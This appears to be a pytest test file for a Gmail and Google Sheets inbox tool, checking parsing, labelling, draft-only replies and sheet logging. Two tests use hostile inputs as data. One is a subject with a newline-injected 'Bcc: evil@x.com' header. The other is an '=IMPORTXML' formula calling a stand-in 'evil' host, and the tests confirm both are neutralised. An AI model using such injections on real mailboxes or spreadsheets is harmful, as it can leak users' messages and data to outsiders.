"""Gmail and Sheets adapters against a fake Google client (no network, no account)."""
import ast
import base64
import email
from pathlib import Path

import pytest

from inbox.adapters import AdapterError
from inbox.google_api import DEMO_LABEL, PROCESSED_LABEL, GmailMailbox, GoogleSheet, message_text
from inbox.models import Email

ROOT = Path(__file__).resolve().parent.parent


def b64(s: str) -> str:
    return base64.urlsafe_b64encode(s.encode()).decode().rstrip("=")


class Req:
    def __init__(self, result=None, error=None):
        self.result, self.error = result, error

    def execute(self, num_retries=0):
        if self.error:
            raise self.error
        return self.result


class Node:
    """Records calls like service.users().messages().list(...)."""

    def __init__(self, fake, path=()):
        self._fake, self._path = fake, path

    def __getattr__(self, name):
        def call(*a, **kw):
            path = self._path + (name,)
            if path in self._fake.leaves:
                self._fake.calls.append((".".join(path), kw))
                return Req(*self._fake.leaves[path](kw))
            return Node(self._fake, path)
        return call


class FakeGoogle:
    def __init__(self, **leaves):
        self.calls = []
        self.leaves = {tuple(k.split("__")): v for k, v in leaves.items()}

    def root(self):
        return Node(self)


MSG = {"id": "m9", "threadId": "t9", "internalDate": "1793700000000", "payload": {
    "mimeType": "multipart/alternative",
    "headers": [{"name": "From", "value": '"Accounts, Riverside Cafe" <accounts@riverside.example>'},
                {"name": "Subject", "value": "Invoice INV-2291"}],
    "parts": [{"mimeType": "text/plain", "body": {"data": b64("We paid INV-2291.\n\n\n\nThanks")}},
              {"mimeType": "text/html", "body": {"data": b64("<p>We paid</p>")}}]}}


def gmail(**extra):
    leaves = {
        "users__messages__list": lambda kw: (({"messages": [{"id": "m9"}]}),),
        "users__messages__get": lambda kw: ((MSG if kw.get("format") == "full" else
                                             {"payload": {"headers": [{"name": "Message-ID", "value": "<orig@x>"}]}}),),
        "users__labels__list": lambda kw: (({"labels": [{"name": "INBOX", "id": "INBOX"}]}),),
        "users__labels__create": lambda kw: (({"id": "L-" + kw["body"]["name"]}),),
        "users__messages__modify": lambda kw: (({}),),
        "users__drafts__create": lambda kw: (({"id": "d1"}),),
        "users__messages__insert": lambda kw: (({"id": "new1"}),),
        "users__threads__get": lambda kw: (({"messages": [
            {"labelIds": ["INBOX"], "internalDate": "1793700000000"},
            {"labelIds": ["SENT"], "internalDate": "1793703600000"}]}),),
    }
    leaves.update(extra)
    fake = FakeGoogle(**leaves)
    return fake, GmailMailbox(fake.root(), query="label:Demo")


def test_fetch_parses_headers_body_and_skips_processed():
    fake, mb = gmail()
    [e] = mb.fetch_new()
    assert (e.from_name, e.from_email, e.subject) == ("Accounts, Riverside Cafe", "accounts@riverside.example",
                                                     "Invoice INV-2291")
    assert e.body == "We paid INV-2291.\n\nThanks" and e.received_at == 1_793_700_000
    assert e.link.endswith("#all/m9")
    q = next(kw for name, kw in fake.calls if name == "users.messages.list")["q"]
    assert q == "label:Demo -label:AI-Processed"


def test_html_only_body_is_stripped():
    payload = {"mimeType": "text/html", "body": {"data": b64("<style>x{}</style><p>Hi&nbsp;there</p><br>Bye")}}
    assert message_text(payload) == "Hi there\n\nBye"   # paragraph end + line break


def test_labels_are_created_once_and_applied():
    fake, mb = gmail()
    mb.add_labels("m9", ["AI/Complaint", "AI/Urgent"])
    mb.mark_processed("m9")
    creates = [kw["body"]["name"] for n, kw in fake.calls if n == "users.labels.create"]
    assert creates == ["AI/Complaint", "AI/Urgent", PROCESSED_LABEL]
    mods = [kw["body"]["addLabelIds"] for n, kw in fake.calls if n == "users.messages.modify"]
    assert mods == [["L-AI/Complaint", "L-AI/Urgent"], ["L-AI/Processed"]]


def test_draft_is_a_threaded_reply_and_not_sent():
    fake, mb = gmail()
    e = Email(message_id="m9", thread_id="t9", from_email="accounts@riverside.example", subject="x", received_at=0)
    assert mb.create_draft(e, "Re: Invoice\nBcc: evil@x.com", "Thanks, receipt attached.") == "d1"
    body = next(kw for n, kw in fake.calls if n == "users.drafts.create")["body"]["message"]
    assert body["threadId"] == "t9"
    msg = email.message_from_bytes(base64.urlsafe_b64decode(body["raw"]))
    assert msg["In-Reply-To"] == "<orig@x>" and msg["References"] == "<orig@x>"
    assert msg["To"] == "accounts@riverside.example" and msg["Bcc"] is None
    assert not any("send" in n for n, _ in fake.calls)


def test_reply_detection_uses_sent_messages_after_the_email():
    _, mb = gmail()
    assert mb.replied_since("t9", 1_793_700_000) is True
    assert mb.replied_since("t9", 1_793_703_600) is False


def test_seeded_emails_get_the_demo_label_and_quoted_sender():
    fake, mb = gmail()
    mb.insert_test_email("Accounts, Riverside Cafe", "a@r.example", "Invoice", "Paid.", "Tue, 03 Nov 2026 10:00:00 +0000")
    kw = next(kw for n, kw in fake.calls if n == "users.messages.insert")
    assert kw["body"]["labelIds"] == ["INBOX", "UNREAD", f"L-{DEMO_LABEL}"] and kw["internalDateSource"] == "dateHeader"
    msg = email.message_from_bytes(base64.urlsafe_b64decode(kw["body"]["raw"]))
    assert email.utils.parseaddr(msg["From"]) == ("Accounts, Riverside Cafe", "a@r.example")


def test_google_errors_become_adapter_errors():
    from googleapiclient.errors import HttpError

    class Resp(dict):
        def __init__(self, status):
            super().__init__(status=str(status))
            self.status, self.reason = status, "x"

    for status, retryable in ((503, True), (429, True), (403, False)):
        fake, mb = gmail(users__messages__list=lambda kw, s=status: (None, HttpError(Resp(s), b"{}")))
        with pytest.raises(AdapterError) as err:
            mb.fetch_new()
        assert err.value.retryable is retryable


def test_sheet_append_uses_raw_values_and_returns_row():
    calls = []
    leaves = {
        "spreadsheets__values__append": lambda kw: (calls.append(kw) or {"updates": {"updatedRange": "'Inbox log'!A7:L7"}},),
        "spreadsheets__values__update": lambda kw: (calls.append(kw) or {},),
    }
    fake = FakeGoogle(**leaves)
    sheet = GoogleSheet(fake.root(), "sid")
    ref = sheet.append({"subject": "=IMPORTXML(\"http://evil\")", "status": "open"})
    assert ref == "7"
    assert calls[0]["valueInputOption"] == "RAW"          # a formula in an email stays plain text
    assert calls[0]["body"]["values"][0][2] == "=IMPORTXML(\"http://evil\")"
    sheet.update_status("7", "overdue")
    assert calls[1]["range"] == "'Inbox log'!K7" and calls[1]["body"] == {"values": [["overdue"]]}


def test_code_never_calls_a_gmail_send_method():
    tree = ast.parse((ROOT / "inbox" / "google_api.py").read_text())
    sends = [n for n in ast.walk(tree) if isinstance(n, ast.Attribute) and n.attr == "send"]
    assert sends == []
